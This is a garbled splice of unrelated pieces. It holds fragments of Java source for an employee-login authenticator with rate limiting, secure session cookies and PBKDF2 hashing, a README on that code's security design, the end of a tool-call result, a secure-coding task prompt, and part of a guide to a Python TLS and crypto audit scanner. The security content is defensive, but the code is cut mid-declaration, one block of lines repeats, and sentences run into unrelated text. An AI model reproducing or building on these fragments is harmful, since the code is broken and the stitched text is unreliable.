An in-memory tracker in a\n    21\t * program that exits after one attempt is no limit at all: the attacker simply runs the program\n    22\t * again and starts from zero. Here the counters are read, updated and written back while an\n    23\t * exclusive {@link FileLock} is held, so concurrent invocations -- separate processes, with no shared\n    24\t * memory between them -- cannot both pass a budget check on the same remaining slot.\n    25\t *\n    26\t * <p>The state file is created {@code rw-------} and its ownership and permissions are re-verified on\n    27\t * every open. That matters more here than it looks: a state file another local account could write\n    28\t * is a way to clear one's own restriction, or to forge a permanent one against someone else.\n    29\t *\n    30\t * <p>Every field read back is parsed and range-checked, and the file is bounded in both size and\n    31\t * record count. A line that does not parse is dropped, which costs the attacker nothing it did not\n    32\t * already have -- the worst case is a counter resetting to zero, which is the same position as a\n    33\t * first attempt -- while a malformed count that was trusted could disable the limit entirely.\n    34\t *\n    35\t * <p>A {@link FileLock} is held by the whole JVM rather than by a thread, so two threads in one\n    36\t * process locking the same file would raise {@link java.nio.channels.OverlappingFileLockException}\n    37\t * rather than queue. An in-process lock keyed by the state file's path therefore guards the file\n    38\t * lock: threads queue on the first, processes queue on the second.\n    39\t *\n    40\t * <p>If the file cannot be read or written, {@link Decision#UNAVAILABLE} is returned and the attempt\n    41\t * is refused. Failing closed is the only safe choice: the alternative is that deleting, corrupting\n    42\t * or locking the state file turns the rate limit off.\n    43\t *\n    44\t * <p>The lock is released before the password derivation runs, so the expensive work is never\n    45\t * serialised behind the bookkeeping.\n    46\t */\n    47\tpublic final class FileAttemptLimiter implements AttemptLimiter It exists\n     9\t * because the portal's web front end wraps exactly this authenticator, and the attributes a session\n    10\t * cookie needs are a property of the session, not of the transport -- leaving them to be\n    11\t * rediscovered by whoever writes the servlet is how a session cookie ends up without\n    12\t * {@code HttpOnly}.\n    13\t *\n    14\t * <p>Every issued cookie carries:\n    15\t * <ul>\n    16\t *   <li>{@code HttpOnly} -- page script cannot read the token, so one XSS flaw elsewhere in the\n    17\t *       portal does not become session theft.</li>\n    18\t *   <li>{@code Secure} -- the token is never sent over plaintext HTTP.</li>\n    19\t *   <li>{@code SameSite=Strict} -- the cookie is not attached to cross-site requests, which removes\n    20\t *       the ambient authority that cross-site request forgery depends on.</li>\n    21\t *   <li>{@code Path=/portal} -- scoped to the application rather than the whole origin, so it is not\n    22\t *       offered to unrelated apps sharing the host.</li>\n    23\t *   <li>{@code Max-Age} matching the server-side idle timeout, so the browser and the server agree\n    24\t *       on when the session is over. The server-side record remains authoritative.</li>\n    25\t * </ul>\n    26\t *\n    27\t * <p>No {@code Domain} attribute is set: omitting it keeps the cookie host-only, where setting it\n    28\t * would widen the cookie to subdomains.\n    29\t */\n    30\tpublic final class SessionCookie {\n    31\t\n    32\t    /** The cookie name. A {@code __Host-} prefix additionally pins the cookie to this exact host. */\n    33\t    public static final String NAME = \"__Host-portal_session\";\n    34\t    private static final String PATH = \"/\";\n    35\t\n    36\t    private SessionCookie() {\n    37\t    }\n    38\t\n    39\t    /**\n    40\t     * Returns the {@code Set-Cookie} value carrying {@code token}.\n    41\t     *\n    42\t     * <p>The {@code __Host-} prefix that browsers enforce requires {@code Secure}, no {@code Domain},\n    43\t     * and {@code Path=/}; Each is 32 bytes drawn from {@link SecureRandom} --\n    20\t * the platform's CSPRNG -- and rendered as unpadded Base64url. 256 bits leaves nothing to guess and\n    21\t * nothing to predict from a previously issued token. No part of a token derives from the username,\n    22\t * the time, a counter, or anything the caller supplied; a token presented by a caller is never\n    23\t * trusted as an identity on its own, only as a lookup key into this server-side table.\n    24\t *\n    25\t * <p>The table is keyed by SHA-256 of the token rather than by the token itself. A token is a bearer\n    26\t * credential, so storing it verbatim would mean a heap dump or an accidental dump of the table\n    27\t * handed over working sessions. The digest is a one-way function of a 256-bit random value, so\n    28\t * precomputation against it is not a concern.\n    29\t *\n    30\t * <p>Two expiries apply: an idle timeout that advances on use, and an absolute lifetime that does\n    31\t * not. Validation, expiry checks and the idle-timeout refresh all happen inside a single\n    32\t * {@link ConcurrentHashMap#compute} call, so a session cannot be validated and expired concurrently\n    33\t * with an inconsistent result. The\n    85\t     * returned value holds the one and only copy of the token this class will ever produce; the\n    86\t     * caller is responsible for getting it to the client over a confidential channel and not\n    87\t     * writing it anywhere else.\n    88\t     *\n    89\t     * @throws IllegalStateException if the session table is full after pruning expired entries; No value from the caller contributes.</li>\n    19\t *   <li><b>Verify with a constant-time comparison.</b></li>\n    20\t *   <li><b>Grant only on an explicit pass.</b> Every other path -- unknown account, malformed\n    21\t *       record, restriction in force, tracking capacity exhausted, unexpected exception -- falls\n    22\t *       through to the same denial. There is no branch that reaches a grant by default.</li>\n    23\t * </ol>\n    24\t *\n    25\t * <p>Every path past input validation performs exactly one PBKDF2 derivation, real or decoy, and\n    26\t * returns the same message. An attempt against a non-existent employee therefore costs the same and\n    27\t * looks the same as an attempt against a real one, which is what stops the login form being used to\n    28\t * enumerate staff.\n    29\t *\n    30\t * <p>The caller owns the password array and must clear it; The\n    90\t     * derived key is zeroed before returning so a heap dump taken afterwards does not contain it.\n    91\t     */\n    92\t    public boolean verify(char[] password, StoredHash stored) {\n    93\t        byte[] derived = derive(password, stored.salt(), stored.iterations());\n    94\t        try {\n    95\t            return MessageDigest.isEqual(derived, stored.hash());\n    96\t        } finally {\n    97\t            Arrays.fill(derived, (byte) 0);\n    98\t        }\n    99\t    }\n   100\t\n   101\t    /**\n   102\t     * Runs one derivation whose result is discarded.\n   103\t     *\n   104\t     * <p>Called when there is no stored hash to verify against -- an unknown username, a malformed\n   105\t     * record, or an account under restriction. The\n    90\t     * derived key is zeroed before returning so a heap dump taken afterwards does not contain it.\n    91\t     */\n    92\t    public boolean verify(char[] password, StoredHash stored) {\n    93\t        byte[] derived = derive(password, stored.salt(), stored.iterations());\n    94\t        try {\n    95\t            return MessageDigest.isEqual(derived, stored.hash());\n    96\t        } finally {\n    97\t            Arrays.fill(derived, (byte) 0);\n    98\t        }\n    99\t    }\n   100\t\n   101\t    /**\n   102\t     * Runs one derivation whose result is discarded.\n   103\t     *\n   104\t     * <p>Called when there is no stored hash to verify against -- an unknown username, a malformed\n   105\t     * record, or an account under restriction. Without it, \"no such account\" would return in\n   106\t     * microseconds while \"wrong password\" took hundreds of milliseconds, and that difference alone\n   107\t     * enumerates the employee directory.\n   108\t     */\n   109\t    public void performDecoyWork() {\n   110\t        char[] decoy = new char[24];\n   111\t        byte[] salt = new byte[SALT_BYTES];\n   112\t        random.nextBytes(salt);\n   113\t        for (int i = 0; i < decoy.length; i++) {\n   114\t            decoy[i] = (char) ('a' + random.nextInt(26));\n   115\t        }\n   116\t        byte[] derived = derive(decoy, salt, iterations);\n   117\t        Arrays.fill(derived, (byte) 0);\n   118\t        Arrays.fill(decoy, '\\0');\n   119\t    }\n   120\t\n   121\t    private static byte[] derive(char[] password, byte[] salt, int iterations) {\n   122\t        PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, KEY_BITS);\n   123\t        try {\n   124\t            return SecretKeyFactory.getInstance(ALGORITHM).generateSecret(spec).getEncoded();\n   125\t        } catch (NoSuchAlgorithmException | InvalidKeySpecException e) {\n   126\t            // A missing PBKDF2 provider is a broken runtime, not a bad password: fail closed and\n   127\t            // loudly rather than letting the caller interpret the absence of a result as a pass.\n   128\t            throw new IllegalStateException(\"password hashing is unavailable\", e);\n   129\t        } finally {\n   130\t            spec.clearPassword();\n   131\t        }\n   132\t    }\n   133\t\n   134\t    /**\n   135\t     * Parses a stored hash string.\n   136\t     *\n   137\t     * <p>The credential file is an input like any other, so every field is validated: the scheme\n   138\t     * must be the one this class emits, the iteration count must parse and sit inside a sane range,\n   139\t     * and both binary fields must be correctly sized Base64. An out-of-range iteration count is\n   140\t     * rejected rather than clamped -- a record claiming one iteration would otherwise turn the KDF\n   141\t     * off, and a record claiming two billion would be a denial of service against the portal.\n   142\t     *\n   143\t     * @throws ValidationException if the encoded form is not well-formed\n   144\t     */\n   145\t    public static }\n   149\t        String[] parts = encoded.split(\"\\\\$\", -1);\n   150\t        if (parts.length != 4) {\n   151\t            throw new ValidationException(\"stored hash has the wrong number of fields\");\n   152\t        }\n   153\t        if (!SCHEME_ID.equals(parts[0].toLowerCase(Locale.ROOT))) {\n   154\t            throw new ValidationException(\"stored hash uses an unrecognised scheme\");\n   155\t        }\n   156\t        int iterations;\n   157\t        try {\n   158\t            iterations = Integer.parseInt(parts[1]);\n   159\t        } catch (NumberFormatException e) {\n   160\t            throw new ValidationException(\"stored hash has a non-numeric iteration count\", e);\n   161\t        }\n   162\t        if (iterations < MIN_ACCEPTED_ITERATIONS || iterations > MAX_ACCEPTED_ITERATIONS) {\n   163\t            throw new ValidationException(\"stored hash iteration count is out of range\");\n   164\t        }\n   165\t        byte[] salt = decodeBase64(parts[2], \"salt\");\n   166\t        byte[] hash = decodeBase64(parts[3], \"hash\");\n   167\t        if (salt.length != SALT_BYTES) {\n   168\t            throw new ValidationException(\"stored hash salt has the wrong length\");\n   169\t        }\n   170\t        if (hash.length != KEY_BITS / 8) {\n   171\t            throw new ValidationException(\"stored hash digest has the wrong length\");\n   172\t        }\n   173\t        return new StoredHash(iterations, salt, hash);\n   174\t    }\n   175\t\n   176\t    private static byte[] decodeBase64(String value, String field) throws ValidationException {\n   177\t        try {\n   178\t            return Base64.getDecoder().decode(value);\n   179\t        } catch (IllegalArgumentException e) {\n   180\t            throw new ValidationException(\"stored hash \" + field + \" is not valid Base64\", e);\n   181\t        }\n   182\t    }\n   183\t\n   184\t    /** A validated stored hash: the parameters needed to re-derive and compare. */\n   185\t    public record StoredHash(int iterations, byte[] salt, byte[] hash) {\n   186\t\n   187\t        public StoredHash(int iterations, byte[] salt, byte[] hash) {\n   188\t            this.iterations = iterations;\n   189\t            this.salt = salt.clone();\n   190\t            this.hash = hash.clone();\n   191\t        }\n   192\t\n   193\t        @Override\n   194\t hash.clone();\n   201\t        }\n   202\t\n   203\t        /** Never renders the digest; a stored hash is still sensitive material. */\n   204\t        @Override\n   205\t        public String Everything used is in the Java standard library, so there is no\n     8\tartefact to download, pin or verify.\n     9\t\n    10\t## Build and run\n    11\t\n    12\t```sh\n    13\t./build.sh test                   # compile and run the adversarial self-test (20 cases)\n    14\t\n    15\texport PORTAL_CREDENTIAL_FILE=/var/lib/portal/employees.auth\n    16\texport PORTAL_AUDIT_LOG=/var/log/portal/audit.log\n    17\t\n    18\tjava -cp out/classes com.example.portal.auth.PortalCli enroll   # register an employee credential\n    19\tjava -cp out/classes com.example.portal.auth.PortalCli login    # authenticate\n    20\t```\n    21\t\n    22\t`login` exits 0 when access is granted, 1 when it is denied, 2 on a configuration or usage error.\n    23\tPasswords are read from the terminal with echo disabled, never from an argument. For scripted use,\n    24\t`--password-stdin` (login) and `--stdin` (enroll) read them from standard input instead.\n    25\t\n    26\t## Shape of the code\n    27\t\n    28\t| File | Responsibility |\n    29\t| --- | --- |\n    30\t| `Authenticator` | The decision: validate, reserve an attempt, look up, verify, grant or deny |\n    31\t| `InputPolicy` | Whitelist validation for usernames, passwords and source identifiers |\n    32\t| `PasswordHasher` | PBKDF2-HMAC-SHA256 hashing, constant-time verification, decoy work |\n    33\t| `CredentialStore` / `FileCredentialStore` | The authoritative employee records |\n    34\t| `AttemptLimiter` | Contract for per-account and per-source attempt budgets |\n    35\t| `AttemptCounters` | The counting rules both trackers share |\n    36\t| `InMemoryAttemptLimiter` | Tracker for a long-lived process (the web front end) |\n    37\t| `FileAttemptLimiter` | Tracker whose counters survive process exit (the console front end) |\n    38\t| `SessionManager` / `Session` | CSPRNG session tokens, stored hashed, validated server-side |\n    39\t| `SessionCookie` | `Set-Cookie` construction for the web front end |\n    40\t| `AuditLog` | Private, append-only log with masked identifiers |\n    41\t| `PrivateFiles` | The owner-only file checks all three files share |\n    42\t| `PortalCli` | Console front end |\n    43\t\n    44\tThe credential file is one `username:pbkdf2-sha256$iterations$salt$hash` record per line, mode\n    45\t`rw-------`. The attempt-tracker state file sits beside it (`--state` to relocate) with the same\n    46\tmode.\n    47\t\n    48\t## How each rule is satisfied\n    49\t\n    50\t### 1. Trust boundaries\n    51\t\n    52\tEvery input is treated as attacker-controlled and validated against a whitelist before use. Nothing\n    53\tfrom a client decides a security outcome; the only authorities are the credential store and the\n    54\tattempt tracker, both server-side.\n    55\t\n    56\t| Input | Source | Validation |\n    57\t| --- | --- | --- |\n    58\t| Username | Client | 3-64 chars, starts with a letter, `[A-Za-z0-9._-]` only, lower-cased so one account is one lockout bucket (`InputPolicy.requireValidUsername`) |\n    59\t| Password | Client | Present, 1-256 chars on login; 12-256 and printable on enrolment (`InputPolicy`) |\n    60\t| Source identifier | Front end, client-influenced | Non-empty, ≤64 chars, IP-literal character set (`InputPolicy.requireValidSource`) |\n    61\t| Session token | Client | Exactly 43 Base64url chars, then used only as a lookup key into server-side state (`SessionManager.hasTokenShape`) |\n    62\t| Credential records | File on disk | Scheme, iteration count range, salt and digest lengths, username syntax, duplicate detection (`PasswordHasher.parse`, `FileCredentialStore`) |\n    63\t| Attempt-tracker records | File on disk | Scope, key syntax, numeric ranges, boolean field (`FileAttemptLimiter.parseInto`) |\n    64\t| File paths, log destination | Options and environment | Length and NUL-byte checked; ownership and permissions verified (`PortalCli.resolvePath`, `PrivateFiles`) |\n    65\t\n    66\tSizes are bounded everywhere a value is stored or read: credential file 8 MiB / 50,000 records / 512\n    67\tchars per line, tracker file 16 MiB / 160 chars per line, attempt keys 100,000 per budget, sessions\n    68\t20,000, console input one line of at most 256 characters, log fields 200 characters.\n    69\t\n    70\tA rejected value is never repaired into an acceptable one. A malformed credential record is dropped,\n    71\tso the account it names simply does not exist; an out-of-range iteration count is refused rather than\n    72\tclamped, because clamping down would disable the KDF and clamping up would be a denial of service.\n    73\t\n    74\t### 2. Secrets\n    75\t\n    76\tNothing in this repository is a working credential. There is no default password, no embedded key, no\n    77\tpepper baked into the source; enrolment is the only way a credential enters the store.\n    78\t\n    79\tPasswords are read with `Console.readPassword` (echo off) or from standard input, never from a\n    80\tcommand-line argument — process arguments are world-readable via `/proc` and land in shell history.\n    81\tA `--password` argument is refused outright, with a message telling the operator to rotate the\n    82\tcredential they just exposed. Paths come from options or environment variables.\n    83\t\n    84\tPasswords, derived keys, salts, stored hashes and session tokens are never printed or logged. The\n    85\t`toString` of `AuthResult`, `Session`, `SessionManager.Issued` and `PasswordHasher.StoredHash` all\n    86\tredact. On success the console prints only the session *reference* — the leading 12 hex characters of\n    87\tthe token's digest, useless as a credential — because a terminal gets scrolled back and screen-shared.\n    88\t\n    89\t### 3. Authentication and access\n    90\t\n    91\tVerification is against `CredentialStore`, the server-side record. The sequence in\n    92\t`Authenticator.authenticate` is: validate input, atomically reserve an attempt slot, look up the\n    93\trecord, verify with a constant-time comparison, and grant only on an explicit pass. Every other path\n    94\t— unknown account, malformed record, restriction in force, tracking capacity exhausted, tracker\n    95\tunavailable, any unexpected exception — falls through to the same denial. There is no branch that\n    96\treaches a grant by default or by omission.\n    97\t\n    98\tRepeated attempts are limited per account *and* per source:\n    99\t\n   100\t| Budget | Default | Stops |\n   101\t| --- | --- | --- |\n   102\t| Account | 5 attempts / 15 min, then restricted 15 min | Guessing many passwords against one employee |\n   103\t| Source | 50 attempts / 15 min, then restricted 15 min | Spraying a guess each across the whole directory |\n   104\t\n   105\tBoth restrictions expire. A permanent lock would mean anyone who knows an employee's username can\n   106\ttake that employee offline at will — the limit becomes the attack. Three further details exist for\n   107\tthe same reason: the source budget is checked first, so attempts a source restriction would refuse\n   108\tanyway are not charged to the employee's account; input that fails validation is rejected before any\n   109\tbudget is touched, so malformed requests cannot burn a legitimate user's allowance; and a successful\n   110\tauthentication clears the account counter (the source counter is only decremented by its one attempt,\n   111\tso holding one valid credential does not reset an attacker's whole source budget).\n   112\t\n   113\tCounters are persisted by `FileAttemptLimiter` for the console front end. This is not incidental: a\n   114\tcommand that exits after one attempt, tracking in memory, has no limit at all — the attacker reruns\n   115\tit. `InMemoryAttemptLimiter` is for the long-lived web process, where the heap outlives the attempt.\n   116\t\n   117\t`enroll` is authorised by the operating system: it must run as the account that owns the credential\n   118\tfile, whose mode is `rw-------`. This program has no notion of an administrative session — see\n   119\t*Residual risk*.\n   120\t\n   121\t### 4. Identifiers and tokens\n   122\t\n   123\tSession tokens are generated here and nowhere else: 32 bytes from `SecureRandom`, rendered as\n   124\tunpadded Base64url. 256 bits of CSPRNG output leaves nothing to guess and nothing to predict from a\n   125\tpreviously issued token; no part derives from the username, the clock, or a counter. A token\n   126\tpresented by a caller is never an identity in itself — its shape is checked, then it is used solely as\n   127\ta lookup key into the server-side table. No externally provided identifier is accepted.\n   128\t\n   129\tThe table is keyed by SHA-256 of the token rather than the token, so a dump of the session table\n   130\thands over nothing usable. Two expiries apply: a 15-minute idle timeout that advances on use, and an\n   131\t8-hour absolute lifetime that does not.\n   132\t\n   133\t`SessionCookie` sets `HttpOnly` (one XSS flaw elsewhere does not become session theft), `Secure`\n   134\t(never sent in plaintext), `SameSite=Strict` (removes the ambient authority CSRF needs), `Path=/`,\n   135\tand a `Max-Age` matching the server-side idle timeout. The `__Host-` name prefix pins the cookie to\n   136\tthe exact host and is backed by the attributes browsers require for it; no `Domain` is set, so the\n   137\tcookie is not widened to subdomains. The builder refuses any value that is not a token this\n   138\tapplication issued, so cookie attributes cannot be smuggled through the value.\n   139\t\n   140\t### 5. Sensitive data\n   141\t\n   142\tThe audit log masks identifiers: an account becomes `a***(len=11)`, a source keeps its network part\n   143\tonly (`10.0.0.*`). Enough to correlate events in an investigation; not a staff directory if the log\n   144\tleaks. Log fields are truncated and stripped of control characters, so no input can forge a log line\n   145\tby embedding a newline and making a failed attempt look like somebody else's success.\n   146\t\n   147\tThe credential file, the audit log and the tracker state file are all created `rw-------` — the\n   148\tpermissions are passed to `Files.createFile` rather than applied afterwards, since a create-then-chmod\n   149\tsequence leaves a window where the file is world-readable. On every open, `PrivateFiles.requireOwnerOnly`\n   150\tre-verifies that each is a regular file (not a symlink or FIFO), owned by this user, with no group or\n   151\tworld bits, in a directory that is not world-writable.\n   152\t\n   153\tCredentials are held in `char[]` and zeroed in `finally` blocks: the submitted password, the\n   154\tconfirmation copy, every PBKDF2-derived key, the `PBEKeySpec`, and the console input buffer. Console\n   155\tinput is read into `char[]` rather than `String` precisely because a `String` cannot be cleared.\n   156\t\n   157\t### 6. Failure behaviour\n   158\t\n   159\tEvery unsuccessful outcome returns the identical `AuthResult.GENERIC_FAILURE_MESSAGE` and no detail\n   160\tfield: `AuthResult` has no \"why\" for a front end to leak, because it was never given one. Reasons go\n   161\tto the audit log only.\n   162\t\n   163\tThe responses also do comparable work. Every path past input validation performs exactly one PBKDF2\n   164\tderivation — a real verification, or `performDecoyWork()` for an unknown account, a malformed record,\n   165\tor a restriction in force. Without it, \"no such employee\" would answer in microseconds while \"wrong\n   166\tpassword\" took hundreds of milliseconds, and that gap alone enumerates the staff list. The self-test\n   167\tasserts both the identical message and the comparable timing.\n   168\t\n   169\tOperator-facing errors are generic too: an I/O failure prints \"The portal is unavailable\", not a path\n   170\tor a stack trace. Configuration problems (a file with the wrong owner or mode) *are* reported\n   171\tspecifically, since that is the operator's own configuration and not a secret.\n   172\t\n   173\t### 7. Concurrency\n   174\t\n   175\tCheck-then-act is atomic everywhere it occurs:\n   176\t\n   177\t- **Count, then allow.** The attempt slot is consumed *before* the password is verified, and the\n   178\t  read-decide-update cycle happens under one exclusive lock — a `ReentrantLock` in the in-memory\n   179\t  tracker, and in the file-backed tracker an in-process lock around an exclusive `FileLock`, so\n   180\t  threads queue on the first and separate processes queue on the second. Verifying first and\n   181\t  counting afterwards would let concurrent requests all observe \"one attempt left\" and proceed\n   182\t  together. The self-test fires 32 and 16 concurrent attempts at a 5-attempt budget and asserts\n   183\t  exactly 5 are handed out.\n   184\t- **Validate, then refresh.** `SessionManager.validate` does its lookup, both expiry checks and the\n   185\t  idle-timeout refresh inside a single `ConcurrentHashMap.compute`.\n   186\t- **Check for a duplicate, then append.** Enrolment holds an exclusive `FileLock` across both steps;\n   187\t  otherwise two concurrent enrolments of one username would both see no record and both append,\n   188\t  leaving an account whose working password depends on file order.\n   189\t\n   190\tNo lock is held across a PBKDF2 derivation, so the expensive work still runs in parallel.\n   191\t\n   192\t### 8. Prefer the platform\n   193\t\n   194\tPlatform mechanisms are used rather than hand-rolled equivalents: `SecretKeyFactory` with\n   195\t`PBKDF2WithHmacSHA256` for hashing, `SecureRandom` for salts and tokens, `MessageDigest.isEqual` for\n   196\tconstant-time comparison, `Console.readPassword` for echo-free input, `FileChannel.lock` for\n   197\tcross-process mutual exclusion, `ConcurrentHashMap.compute` for atomic state updates, and\n   198\t`PosixFilePermissions` passed at creation time for private files.\n   199\t\n   200\tThere are no third-party dependencies, no downloads, and nothing loaded from a shared or\n   201\tworld-writable location — in fact the code refuses to read a credential, log or state file that sits\n   202\tin a world-writable directory or that another account can reach.\n   203\t\n   204\t## Residual risk\n   205\t\n   206\tStated rather than hidden, since each is a deliberate boundary of this component:\n   207\t\n   208\t- **`enroll` is authorised by file ownership, not by this program.** Anyone who can run it as the\n   209\t  portal user can set any employee's password. Restrict the account; the alternative is an\n   210\t  administrative session mechanism, which belongs in the portal, not in a credential tool.\n   211\t- **PBKDF2, not Argon2id.** PBKDF2 is not memory-hard, so it resists GPU attack less well than\n   212\t  Argon2id or scrypt. It is used because it is in the JDK: adopting Argon2id means a third-party\n   213\t  dependency to pin, verify and keep patched. 600,000 iterations is the current OWASP figure for\n   214\t  PBKDF2-HMAC-SHA256. Each stored hash carries its own iteration count, so the figure can be raised\n   215\t  without invalidating existing records.\n   216\t- **Attempt counters are keyed by username and source in a plaintext file.** The file is\n   217\t  `rw-------` and ownership-checked, but an attacker who already has that account can read who has\n   218\t  been failing to log in. Keying by digest would break the operator's ability to clear a specific\n   219\t  restriction.\n   220\t- **The source identifier is only as trustworthy as the front end that supplies it.** It is strictly\n   221\t  validated and rate-limits are bucketed by it, so the worst an attacker who can vary it achieves is\n   222\t  spreading attempts across buckets — the per-account budget still applies. Feed it from the\n   223\t  connection's peer address, not from a client-supplied header such as `X-Forwarded-For`, unless a\n   224\t  trusted proxy sets that header and strips any inbound copy.\n   225\t- **Sessions issued by the console front end live and die with the process.** `SessionManager` is\n   226\t  built for the long-lived web front end; the CLI prints a session reference to show that issuance\n   227\t  worked. A multi-process deployment needs a shared session store, which is a deployment decision.\n   228\t- **Timing distinguishes malformed input from a real attempt**, since validation happens before any\n   229\t  derivation. This reveals only the username and password syntax rules, which are public, and never\n   230\t  whether an account exists.\n   231\t- **Masked log identifiers are not anonymous.** `a***(len=11)` narrows an account, by design, so that\n   232\t  an operator can correlate entries. Treat the audit log as sensitive; it is created `rw-------`.\n   233\t- **No notification on restriction.** An employee is not told their account is under restriction,\n   234\t  because an identical message for every outcome is what stops account enumeration. Operationally,\n   235\t  the service desk reads the audit log.\n","exit_code":0,"status":"completed"}}

The program should allow employees to enter their username and password, check the supplied credentials against stored employee records, and grant or deny access based on whether the credentials are valid. The program should restrict excessive failed authentication attempts by tracking failed login attempts and applying a defined restriction once the permitted number of attempts is exceeded. BEFORE you write the code, think about how a security reviewer would attack this feature, and write the code so that reviewer has nothing to report. Apply these rules: 1. Trust boundaries. List every input this code can receive - including values from files, databases, configuration, environment, and anything a client controls - and treat everyone as attacker-controlled. Never use such a value without validating it (type, length, allowed characters, range), and never let it decide a security outcome unless it is checked against server-side state. 2. Secrets. Do not include credentials, keys, or passwords that would work if someone ran the program. Secrets come from configuration or runtime input, are never printed or logged, never placed in command-line arguments, error messages, or files readable by other users. 3. Authentication and access. Anything that proves who a user is or what they may do must be verified against server-side state; a missing or failed check fails closed, never open. Limit repeated attempts per source as well as per account, so an attacker cannot use your own limit to lock a legitimate user out. 4. Identifiers and tokens. Session identifiers and tokens must be generated by this code with a cryptographically secure random source - never accepted from or predictable from the caller. If the task says to use an externally provided identifier, validate it strictly and document the remaining risk. Cookies carry HttpOnly, Secure, SameSite, and a correct path. 5. Sensitive data. Mask sensitive values in logs and output; write them only to files created private to the owner; bound the size of anything you store; clear credentials from memory when done. 6. Failure behaviour. Report errors to users in generic terms; details go to the log only. Never let a response reveal whether an account or record exists: give identical messages and do comparable work for every failure outcome. Reject unknown or invalid input - never substitute a permissive default. 7. Concurrency. Where you check state and then act on it (verify, then grant; count, then allow), make the check and the action atomic. 8. Prefer the platform. If the framework has a built-in, proven mechanism for this job, use it rather than hand-rolling your own. If third-party code, libraries or remote files are needed, name specific versions from official sources, verify downloaded files before using them, and never load or run code found in shared or world-writable locations. This skill covers building an automated crypto audit tool that scans Python and configuration files for common cryptographic weaknesses.\n\n\n## When to Use\n\n- When conducting security assessments that involve performing cryptographic audit of application\n- When following incident response procedures for related security events\n- When performing scheduled security testing or auditing activities\n- When validating security controls through hands-on testing\n\n## Prerequisites\n\n- Familiarity with cryptography concepts and tools\n- Access to a test or lab environment for safe RC4)\n- Identify insecure cipher modes (ECB) and padding schemes\n- Find hardcoded keys, passwords, and secrets in source code\n- Verify TLS/SSL configuration strength\n- Check key derivation function parameters\n- Validate random number generator usage\n- Produce a structured audit report with findings and remediation\n\n## Key Concepts\n\n### Cryptographic Weakness Categories\n\n| Category | Examples | Risk Level |\n|----------|----------|------------|\n| Weak Hashing | MD5, SHA-1 for integrity/signatures | High |\n| Insecure Encryption | DES, 3DES, RC4, Blowfish | High |\n| Bad Cipher Mode | ECB mode for any block cipher | High |\n| Insufficient Key Size | RSA < 2048, AES-128 for long-term | Medium |\n| Hardcoded Secrets | Keys/passwords in source code | Critical |\n| Weak KDF | Low iteration PBKDF2, plain MD5 | High |\n| Poor Entropy | time-based seeds, predictable IVs | High |\n| Deprecated Protocols | SSLv3, TLS 1.0, TLS 1.1 | High |\n\n## Security Considerations\n\n- Review both application code and configuration files\n- Check third-party dependencies for known crypto vulnerabilities\n- Verify certificates and TLS configurations on deployed servers\n- Ensure secrets are loaded from environment variables or vaults\n- Review key storage and rotation practices\n\n## Validation Criteria\n\n- [ ] Scanner detects all injected test weaknesses\n- [ ] MD5/SHA-1 usage for security purposes is flagged\n- [ ] ECB mode usage is flagged\n- [ ] Hardcoded keys/passwords are detected\n- [ ] Weak KDF parameters are identified\n- [ ] Report includes severity, location, and remediation\n- [ ] False positive rate is below Audit\n\n## Libraries Used\n\n| Library | Purpose |\n|---------|---------|\n| `ssl` | TLS connection inspection and cipher suite enumeration |\n| `socket` | TCP connections for TLS handshake testing |\n| `cryptography` | Certificate parsing, key strength analysis |\n| `json` | Structure audit findings |\n| `datetime` | Check certificate validity periods |\n\n## Installation\n\n```bash\npip install cryptography\n```\n\n## TLS Configuration Audit\n\n### Check TLS Version and Cipher Suite\n```python\nimport ssl\nimport socket\n\ndef check_tls_config(hostname, port=443):\n    context = ssl.create_default_context()\n    with socket.create_connection((hostname, port), timeout=10) as sock:\n        with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n            return {\n                \"hostname\": hostname,\n                \"protocol\": ssock.version(),\n                \"cipher\": ssock.cipher()[0],\n                \"cipher_bits\": ssock.cipher()[2],\n                \"compression\": ssock.compression(),\n            }\n```\n\n### Test for Weak TLS Versions\n```python\nWEAK_PROTOCOLS = {\n    ssl.PROTOCOL_TLSv1: \"TLSv1.0\",\n    ssl.PROTOCOL_TLSv1_1: \"TLSv1.1\",\n}\n\ndef test_weak_tls(hostname, port=443):\n    findings = []\n    for protocol_const, name in WEAK_PROTOCOLS.items():\n        try:\n            ctx = ssl.SSLContext(protocol_const)\n            ctx.check_hostname = False\n            ctx.verify_mode = ssl.CERT_NONE\n            with socket.create_connection((hostname, port), timeout=5) as sock:\n                with ctx.wrap_socket(sock) as ssock:\n                    findings.append({\n                        \"protocol\": name,\n                        \"supported\": True,\n                        \"severity\": \"high\",\n                        \"issue\": f\"{name} is supported — deprecated and insecure\",\n                    })\n        except (ssl.SSLError, ConnectionRefusedError, OSError):\n            findings.append({\"protocol\": name, \"supported\": False})\n    return findings\n```\n\n### Enumerate Supported Cipher Suites\n```python\nWEAK_CIPHERS = {\n    \"RC4\", \"DES\", \"3DES\", \"MD5\", \"NULL\", \"EXPORT\", \"anon\", \"CBC\",\n}\n\ndef check_cipher_suites(hostname, port=443):\n    context = ssl.create_default_context()\n    context.set_ciphers(\"ALL:COMPLEMENTOFALL\")\n    findings = []\n    try:\n        with socket.create_connection((hostname, port), timeout=10) as sock:\n            with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n                cipher_name, protocol, bits = ssock.cipher()\n                is_weak = any(w in cipher_name for w in WEAK_CIPHERS)\n                findings.append({\n                    \"cipher\": cipher_name,\n                    \"bits\": bits,\n                    \"weak\": is_weak,\n                    \"severity\": \"high\" if is_weak else \"pass\",\n                })\n    except ssl.SSLError as e:\n        findings.append({\"error\": str(e)})\n    return findings\n```\n\n## Certificate Analysis\n\n### Parse and Audit Certificate\n```python\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives.asymmetric import rsa, ec\nfrom datetime import datetime, timezone\n\ndef audit_certificate(hostname, port=443):\n    context = ssl.create_default_context()\n    with socket.create_connection((hostname, port), timeout=10) as sock:\n        with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n            der_cert = ssock.getpeercert(binary_form=True)\n\n    cert = x509.load_der_x509_certificate(der_cert)\n    pub_key = cert.public_key()\n\n    findings = []\n    # Key strength check\n    if isinstance(pub_key, rsa.RSAPublicKey):\n        key_size = pub_key.key_size\n        if key_size < 2048:\n            findings.append({\n                \"check\": \"key_size\",\n                \"severity\": \"critical\",\n                \"detail\": f\"RSA key {key_size} bits — minimum 2048 required\",\n            })\n    elif isinstance(pub_key, ec.EllipticCurvePublicKey):\n        key_size = pub_key.curve.key_size\n        if key_size < 256:\n            findings.append({\n                \"check\": 